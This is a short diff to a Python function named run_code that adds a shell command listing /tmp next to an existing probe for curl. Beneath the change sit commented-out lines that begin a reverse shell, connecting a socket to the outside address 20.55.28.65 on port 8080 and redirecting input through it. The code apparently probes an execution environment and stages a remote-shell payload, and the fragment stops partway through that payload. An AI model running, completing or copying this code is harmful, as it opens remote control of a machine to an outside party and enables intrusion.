@@ -60,6 +60,10 @@ def run_code():
     output_string = result.stdout
     print(f"whereis curl command: {output_string}")
 
+    result = subprocess.run("ls /tmp", shell=True, capture_output=True, text=True)
+    output_string = result.stdout
+    print(f"ls command: {output_string}")
+
     #s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
     #s.connect(("20.55.28.65",8080))
     #os.dup2(s.fileno(),0)
